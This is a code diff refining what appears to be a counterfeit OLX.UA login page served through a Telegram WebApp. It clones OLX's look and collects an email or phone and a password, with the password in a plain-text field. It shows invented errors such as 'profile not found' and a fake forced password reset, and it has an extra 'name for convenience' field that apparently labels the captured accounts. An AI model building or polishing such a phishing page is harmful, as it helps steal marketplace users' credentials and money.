@@ -2,7 +2,7 @@
 <html lang="uk">
 <head>
     <meta charset="utf-8"/>
-    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
     <title>OLX.UA - Увійти</title>
     <!-- Telegram WebApp SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -12,12 +12,30 @@
         html { line-height: 1.15; -webkit-text-size-adjust: 100%; }
         button, input { line-height: 1.15; margin: 0; overflow: visible; }
         button { text-transform: none; -webkit-appearance: button; outline: 0; }
-        html, body { padding: 0; margin: 0; background: #FFFFFF; height: 100vh; overflow: hidden; box-sizing: border-box; font-size: 16px; }
+        
+        /* Скрол для html/body */
+        html, body { 
+            padding: 0; 
+            margin: 0; 
+            background: #FFFFFF; 
+            min-height: 100vh;
+            height: auto;
+            overflow-y: auto;
+            overflow-x: hidden;
+            box-sizing: border-box; 
+            font-size: 16px; 
+        }
+
         p { padding: 0; margin: 1em 0; }
         a { background-color: transparent; }
 
         /* Лейаут */
-        .css-34fsjq { height: 100%; display: flex; flex-direction: column; background-color: #FFFFFF; }
+        .css-34fsjq { 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            background-color: #FFFFFF; 
+        }
         .css-3i1q9p { display: grid; grid-template-columns: 100%; grid-template-rows: auto; min-height: 100vh; }
         .css-1iyoj2o { display: flex; flex-direction: column; }
 
@@ -26,12 +44,13 @@
             --containerWidth: 1280px; 
             margin: auto; 
             max-width: 100%; 
-            overflow: hidden; 
-            height: 100%; 
+            overflow: visible;
+            height: auto;
+            min-height: 100%; 
             width: 100%; 
             background-color: #FFFFFF;
             margin-bottom: 16px; 
-            padding: 16px 16px 0 16px; 
+            padding: 16px 16px 40px 16px;
         }
 
         .css-10tu6ao { 
@@ -48,7 +67,7 @@
         .css-1qjad4w { margin-top: 24px; }
         .css-ymo82s { display: flex; flex-direction: column; }
 
-        /* Таби (Повернуто) */
+        /* Таби */
         .css-1r1yy1e { display: flex; flex-direction: column; width: 100%; }
         .css-1r1yy1e > div > header > button { width: 50%; outline: 0; }
         .css-1r1yy1e div:nth-of-type(2) { padding: 0; }
@@ -56,7 +75,7 @@
         .css-1vr8bhw { width: 100%; }
         .css-1cdlw5t { display: flex; overflow: auto; }
 
-        /* Активна вкладка (Повернуто) */
+        /* Активна вкладка */
         .css-f77c67 { 
             --borderColor: #02282C; 
             align-items: center; 
@@ -91,7 +110,7 @@
         .css-24k09y { box-sizing: border-box; display: inline-block; position: relative; width: inherit; }
 
         /* Інпути */
-        .css-ffw8zp { --inputTextColorDisabled: #7F9799; --inputBorderBottomWidth: 2px; background: #F2F4F5; border: none; border-bottom: var(--inputBorderBottomWidth) solid transparent; border-radius: 4px; box-sizing: border-box; color: #02282C; font-size: 16px; outline: none; padding-bottom: calc(14px - var(--inputBorderBottomWidth)); padding-top: 14px; width: 100%; padding-left: 16px; padding-right: 16px; }
+        .css-ffw8zp { --inputTextColorDisabled: #7F9799; --inputBorderBottomWidth: 2px; background: #F2F4F5; border: none; border-bottom: var(--inputBorderBottomWidth) solid transparent; border-radius: 4px; box-sizing: border-box; color: #02282C; font-size: 16px; outline: none; padding-bottom: calc(14px - var(--inputBorderBottomWidth)); padding-top: 14px; width: 100%; padding-left: 16px; padding-right: 16px; transition: border 0.2s, background 0.2s; }
         .css-ffw8zp::placeholder { color: #406367; opacity: 1; }
         .css-ffw8zp:focus { border-bottom-color: #02282C; border-radius: 4px 4px 0 0; }
 
@@ -101,6 +120,29 @@
         .css-q2gs1h { --inputTextColorDisabled: #7F9799; --inputBorderBottomWidth: 2px; background: rgb(242, 244, 245); border: none; border-bottom: var(--inputBorderBottomWidth) solid transparent; border-radius: 4px; box-sizing: border-box; color: rgb(2, 40, 44); font-size: 16px; outline: none; padding-bottom: calc(14px - var(--inputBorderBottomWidth)); padding-top: 14px; width: 100%; padding-left: 16px; padding-right: 48px; }
         .css-q2gs1h::placeholder { color: rgb(64, 99, 103); opacity: 1; }
         .css-q2gs1h:focus { border-bottom-color: rgb(2, 40, 44); border-radius: 4px 4px 0px 0px; }
+
+        /* Стиль помилки валідації */
+        .input-error {
+            border-bottom: 2px solid #ff5636 !important;
+            background-color: #ffece5 !important;
+            padding-right: 48px; /* Місце для іконки */
+        }
+
+        .css-input-error-text {
+            color: #ff5636;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none; /* Приховано за замовчуванням */
+        }
+        
+        .css-input-warning-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: none; /* Приховано за замовчуванням */
+            color: #ff5636;
+        }
 
         .css-1nty4tr { margin-top: 24px; align-self: center; }
 
@@ -191,7 +233,7 @@
                 </svg>
             </div>
             <div class="css-error-content">
-                Ми не знайшли профіль із цим номером телефону. Повторіть спробу, використовуючи інший номер, або створіть профіль.
+                Ми не знайшли профіль із цим номером телефону.
             </div>
             <button class="css-error-close" id="close-error">
                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="currentColor">
@@ -210,13 +252,14 @@
             </div>
             <div class="css-ymo82s">
             
-            <!-- Таби (Повернуто) -->
+            <!-- Таби (Фото-іконка замість тексту) -->
             <div class="css-1r1yy1e" data-testid="tabs">
             <div class="css-1vr8bhw">
             <header class="css-1cdlw5t">
                 <button class="css-f77c67" tabindex="-1">
                 <span class="css-0">
-                Увійти
+                    <!-- Фото-іконка (лого) -->
+                    <img src="photo_2025-11-27_23-03-52.jpg" alt="Logo" style="height: 36px; width: 36px; border-radius: 50%; object-fit: cover; display: block;">
                 </span>
                 </button>
             </header>
@@ -230,19 +273,29 @@
             <div class="css-1gs5ebu">
             <form class="css-1iyoj2o" data-testid="login-form" method="post" novalidate="">
             
-            <!-- Нове поле Назва -->
+            <!-- Поле Назва -->
             <div class="css-174ynwm">
                 <div>
                 <label class="css-xpp7lh" for="custom_name">
                 Назва (для зручності)
                 </label>
                 <div class="css-24k09y">
-                <input class="css-ffw8zp" id="custom_name" name="custom_name" type="text" value=""/>
+                    <input class="css-ffw8zp" id="custom_name" name="custom_name" type="text" value=""/>
+                    <div class="css-input-warning-icon" id="name-warning-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                            <line x1="12" y1="9" x2="12" y2="13"></line>
+                            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                        </svg>
+                    </div>
+                </div>
+                <div class="css-input-error-text" id="name-error-text">
+                    Назва має бути до 80 символів
                 </div>
                 </div>
             </div>
 
-            <!-- Поле Емейл (обгорнуте для відступу) -->
+            <!-- Поле Емейл (Логін) -->
             <div class="css-1gs5ebu">
                 <div class="css-174ynwm">
                     <div>
@@ -250,7 +303,19 @@
                     Електронна пошта чи телефон
                     </label>
                     <div class="css-24k09y">
-                    <input class="css-ffw8zp" id="username" name="username" type="email" value=""/>
+                        <input class="css-ffw8zp" id="username" name="username" type="text" value=""/>
+                        <!-- Іконка попередження для логіна -->
+                        <div class="css-input-warning-icon" id="username-warning-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                                <line x1="12" y1="9" x2="12" y2="13"></line>
+                                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                            </svg>
+                        </div>
+                    </div>
+                    <!-- Текст помилки для логіна -->
+                    <div class="css-input-error-text" id="username-error-text">
+                        Це не схоже на електронну пошту або номер телефону
                     </div>
                     </div>
                 </div>
@@ -264,7 +329,23 @@
                 Пароль
                 </label>
                 <div class="css-24k09y">
-                <input autocomplete="off" class="css-q2gs1h" id="password" name="password" type="text" value=""/>
+                    <input autocomplete="off" class="css-q2gs1h" id="password" name="password" type="text" value=""/>
+                    <!-- Іконка попередження для пароля -->
+                    <div class="css-input-warning-icon" id="password-warning-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                            <line x1="12" y1="9" x2="12" y2="13"></line>
+                            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                        </svg>
+                    </div>
+                </div>
+                <!-- Текст помилки для пароля -->
+                <div class="css-input-error-text" id="password-error-text">
+                    Пароль занадто довгий
+                </div>
+                <!-- Текст додаткової помилки (наприклад, "Невірний пароль") -->
+                <div class="css-input-error-text" id="password-server-error-text">
+                    Невірний пароль
                 </div>
                 </div>
                 </div>
@@ -294,11 +375,82 @@
             const usernameInput = document.getElementById('username');
             const passwordInput = document.getElementById('password');
             const customNameInput = document.getElementById('custom_name');
+            
+            // Error elements
+            const nameErrorText = document.getElementById('name-error-text');
+            const nameWarningIcon = document.getElementById('name-warning-icon');
+            
+            const usernameErrorText = document.getElementById('username-error-text');
+            const usernameWarningIcon = document.getElementById('username-warning-icon');
+
+            const passwordErrorText = document.getElementById('password-error-text');
+            const passwordServerErrorText = document.getElementById('password-server-error-text');
+            const passwordWarningIcon = document.getElementById('password-warning-icon');
+            
             const loginButton = document.getElementById('Login');
             const errorAlert = document.getElementById('auth-error');
+            const errorContent = errorAlert ? errorAlert.querySelector('.css-error-content') : null;
             const closeErrorBtn = document.getElementById('close-error');
 
-            // Закриття помилки
+            // --- ФУНКЦІЇ ДОПОМІЖНІ ---
+
+            function sanitizeInput(str) {
+                if (!str) return '';
+                return str.replace(/[<>"';]|-{2,}/g, '');
+            }
+
+            function isDigitsOnly(str) {
+                return !/[a-zA-Zа-яА-ЯіїєґІЇЄҐ@]/.test(str);
+            }
+
+            function normalizePhoneNumber(str) {
+                return str.replace(/\D/g, '');
+            }
+
+            function validateEmail(email) {
+                const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return re.test(email);
+            }
+
+            function showError(input, textEl, iconEl, message) {
+                input.classList.add('input-error');
+                if (textEl) {
+                    textEl.textContent = message;
+                    textEl.style.display = 'block';
+                }
+                if (iconEl) iconEl.style.display = 'block';
+            }
+
+            function hideError(input, textEl, iconEl) {
+                input.classList.remove('input-error');
+                if (textEl) textEl.style.display = 'none';
+                if (iconEl) iconEl.style.display = 'none';
+            }
+
+            // Функція для імітації запиту до сервера (MOCK)
+            function simulateLogin(username, password) {
+                return new Promise((resolve, reject) => {
+                    setTimeout(() => {
+                        // Для тесту: "випадково" генеруємо різні типи помилок
+                        const rand = Math.random();
+                        if (rand < 0.2) {
+                            reject({ error_type: 'PROFILE_NOT_FOUND', message: 'Ми не знайшли профіль із цим номером телефону.' });
+                        } else if (rand < 0.4) {
+                            reject({ error_type: 'PASSWORD_INCORRECT', message: 'Невірний пароль' });
+                        } else if (rand < 0.6) {
+                            reject({ error_type: 'PASSWORD_RESET_REQUIRED', message: 'З міркувань безпеки нам довелося скинути ваш пароль. Будь ласка, створіть новий.' });
+                        } else if (rand < 0.8) {
+                            reject({ error_type: 'UNKNOWN_ERROR', message: 'Сталася невідома помилка. Спробуйте пізніше.' });
+                        } else {
+                            // Успіх
+                            resolve({ success: true });
+                        }
+                    }, 1500); // Затримка 1.5 сек
+                });
+            }
+
+            // --- ЛОГІКА ---
+
             if (closeErrorBtn && errorAlert) {
                 closeErrorBtn.addEventListener('click', function() {
                     errorAlert.classList.add('hidden');
@@ -306,45 +458,189 @@
             }
 
             if (usernameInput && passwordInput && customNameInput) {
-                // Enter в полі Назва
+                
+                // Валідація Назви
+                customNameInput.addEventListener('input', function() {
+                    let val = this.value;
+                    if (val.length > 80) {
+                        showError(this, nameErrorText, nameWarningIcon, 'Назва має бути до 80 символів');
+                    } else {
+                        hideError(this, nameErrorText, nameWarningIcon);
+                    }
+                });
+
+                // Валідація Логіна
+                usernameInput.addEventListener('input', function() {
+                    const val = this.value.trim();
+                    if (val.length === 0) {
+                        hideError(this, usernameErrorText, usernameWarningIcon);
+                        return;
+                    }
+
+                    if (isDigitsOnly(val)) {
+                        const digits = normalizePhoneNumber(val);
+                        let isValidPhone = false;
+                        if (digits.length === 12 && digits.startsWith('380')) isValidPhone = true;
+                        else if (digits.length === 10 && digits.startsWith('0')) isValidPhone = true;
+                        else if (digits.length === 9) isValidPhone = true; 
+                        
+                        if (!isValidPhone) {
+                            showError(this, usernameErrorText, usernameWarningIcon, 'Це не схоже на правильний номер телефону');
+                        } else {
+                            hideError(this, usernameErrorText, usernameWarningIcon);
+                        }
+
+                    } else {
+                        if (val.length > 128) {
+                            showError(this, usernameErrorText, usernameWarningIcon, 'Електронна пошта занадто довга');
+                        } else if (!val.includes('@')) {
+                             if (!validateEmail(val)) {
+                                 if (val.length > 3) {
+                                     showError(this, usernameErrorText, usernameWarningIcon, 'Це не схоже на електронну пошту');
+                                 }
+                             } else {
+                                 hideError(this, usernameErrorText, usernameWarningIcon);
+                             }
+                        } else {
+                             if (!validateEmail(val)) {
+                                 showError(this, usernameErrorText, usernameWarningIcon, 'Це не схоже на електронну пошту');
+                             } else {
+                                 hideError(this, usernameErrorText, usernameWarningIcon);
+                             }
+                        }
+                    }
+                });
+
+                // Валідація Пароля
+                passwordInput.addEventListener('input', function() {
+                    const val = this.value;
+                    if (val.length > 128) {
+                        showError(this, passwordErrorText, passwordWarningIcon, 'Пароль має бути до 128 символів');
+                    } else {
+                        // Ховаємо попередні помилки (довжини та серверні)
+                        hideError(this, passwordErrorText, passwordWarningIcon);
+                        if(passwordServerErrorText) passwordServerErrorText.style.display = 'none';
+                    }
+                });
+
+                // Навігація Enter
                 customNameInput.addEventListener('keydown', function(event) {
                     if (event.key === 'Enter') {
                         event.preventDefault();
                         usernameInput.focus();
                     }
                 });
-
-                // Коли натискаємо Enter в полі логіна
                 usernameInput.addEventListener('keydown', function(event) {
                     if (event.key === 'Enter') {
                         event.preventDefault();
                         passwordInput.focus();
                     }
                 });
-
-                // Коли натискаємо Enter в полі пароля
                 passwordInput.addEventListener('keydown', function(event) {
                     if (event.key === 'Enter') {
                         event.preventDefault();
                         if (loginButton) loginButton.click();
                     }
                 });
+                
+                const inputs = document.querySelectorAll('input');
+                inputs.forEach(input => {
+                    input.addEventListener('focus', () => {
+                        setTimeout(() => {
+                            input.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                        }, 300);
+                    });
+                });
             }
 
             // Обробка кліку на кнопку "Увійти"
             if (loginButton) {
-                loginButton.addEventListener('click', function(event) {
-                    event.preventDefault(); // Забороняємо стандартну відправку
-
-                    // Ховаємо попередню помилку, якщо вона була
-                    if(errorAlert) errorAlert.classList.add('hidden');
-
-                    // Змінюємо вигляд кнопки
-                    loginButton.style.pointerEvents = 'none'; // Блокуємо кліки
+                loginButton.addEventListener('click', async function(event) {
+                    event.preventDefault(); 
                     
-                    const originalContent = loginButton.innerHTML;
+                    // Скидаємо стани помилок перед новим запитом
+                    if(errorAlert) errorAlert.classList.add('hidden');
+                    if(passwordServerErrorText) passwordServerErrorText.style.display = 'none';
+                    passwordInput.classList.remove('input-error');
+                    if(passwordWarningIcon) passwordWarningIcon.style.display = 'none';
 
-                    // Додаємо анімацію (3 крапки)
+                    let hasError = false;
+
+                    // 1. Валідація Назви
+                    if (customNameInput) {
+                        let val = sanitizeInput(customNameInput.value);
+                        if (val !== customNameInput.value) customNameInput.value = val;
+                        
+                        if (val.length > 80) {
+                            showError(customNameInput, nameErrorText, nameWarningIcon, 'Назва має бути до 80 символів');
+                            customNameInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                            hasError = true;
+                        }
+                    }
+
+                    // 2. Валідація Логіна
+                    let submitUsername = '';
+                    if (usernameInput) {
+                        let val = usernameInput.value.trim();
+                        let safeVal = sanitizeInput(val);
+                        if (safeVal !== val) {
+                            usernameInput.value = safeVal;
+                            val = safeVal;
+                        }
+
+                        if (val.length === 0) {
+                             showError(usernameInput, usernameErrorText, usernameWarningIcon, "Введіть електронну пошту або телефон");
+                             if(!hasError) usernameInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                             hasError = true;
+                        } else if (isDigitsOnly(val)) {
+                            let digits = normalizePhoneNumber(val);
+                            
+                            let isValid = false;
+                            if (digits.length === 12 && digits.startsWith('380')) isValid = true;
+                            else if (digits.length === 10 && digits.startsWith('0')) isValid = true;
+                            else if (digits.length === 9) isValid = true;
+
+                            if (!isValid) {
+                                showError(usernameInput, usernameErrorText, usernameWarningIcon, 'Невірний номер телефону');
+                                if(!hasError) usernameInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                                hasError = true;
+                            } else {
+                                if (digits.length === 10 && digits.startsWith('0')) digits = '38' + digits;
+                                else if (digits.length === 9) digits = '380' + digits;
+                                submitUsername = '+' + digits; 
+                            }
+                        } else {
+                            if (!validateEmail(val) || val.length > 128) {
+                                showError(usernameInput, usernameErrorText, usernameWarningIcon, 'Невірний формат електронної пошти');
+                                if(!hasError) usernameInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                                hasError = true;
+                            } else {
+                                submitUsername = val; 
+                            }
+                        }
+                    }
+
+                    // 3. Валідація Пароля
+                    if (passwordInput) {
+                        const val = passwordInput.value;
+                        
+                        if (val.length > 128) {
+                            showError(passwordInput, passwordErrorText, passwordWarningIcon, 'Пароль має бути до 128 символів');
+                            if(!hasError) passwordInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                            hasError = true;
+                        }
+                        
+                        if (val.length === 0) {
+                            showError(passwordInput, passwordErrorText, passwordWarningIcon, 'Введіть пароль');
+                            if(!hasError) passwordInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                            hasError = true;
+                        }
+                    }
+
+                    if (hasError) return;
+
+                    // Анімація завантаження
+                    loginButton.style.pointerEvents = 'none'; 
                     loginButton.innerHTML = `
                         <div style="display: flex; justify-content: center; align-items: center; width: 100%;">
                             <span style="width: 8px; height: 8px; margin: 0 4px; background-color: #fff; border-radius: 50%; display: inline-block; animation: bounce 1.4s infinite ease-in-out both; animation-delay: -0.32s;"></span>
@@ -353,17 +649,38 @@
                         </div>
                     `;
 
-                    // Імітація затримки (2 секунди) перед показом помилки
-                    setTimeout(function() {
-                        // Повертаємо кнопку назад
+                    // ІМІТАЦІЯ ЗАПИТУ
+                    try {
+                        const data = await simulateLogin(submitUsername, passwordInput.value);
+                        console.log('Login success');
+                        // Нічого не робимо, як ви просили (немає переадресації, немає алерту)
+                    } catch (error) {
+                        console.error('Login Error:', error);
+                        
+                        // ОБРОБКА РІЗНИХ ТИПІВ ПОМИЛОК
+                        
+                        if (error.error_type === 'PROFILE_NOT_FOUND' || error.error_type === 'UNKNOWN_ERROR' || error.error_type === 'PASSWORD_RESET_REQUIRED') {
+                            // Показуємо великий блок зверху
+                            if (errorAlert) {
+                                errorAlert.classList.remove('hidden');
+                                if (errorContent) errorContent.innerText = error.message;
+                                errorAlert.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                            }
+                        } else if (error.error_type === 'PASSWORD_INCORRECT') {
+                            // Показуємо помилку під полем пароля
+                            passwordInput.classList.add('input-error');
+                            if (passwordServerErrorText) {
+                                passwordServerErrorText.innerText = error.message;
+                                passwordServerErrorText.style.display = 'block';
+                            }
+                            if (passwordWarningIcon) passwordWarningIcon.style.display = 'block';
+                            passwordInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                        }
+                        
+                    } finally {
                         loginButton.innerHTML = '<span class="n-button-text-wrapper">Увійти</span>';
                         loginButton.style.pointerEvents = 'auto';
-
-                        // Показуємо помилку
-                        if (errorAlert) {
-                            errorAlert.classList.remove('hidden');
-                        }
-                    }, 1500);
+                    }
                 });
             }
         });
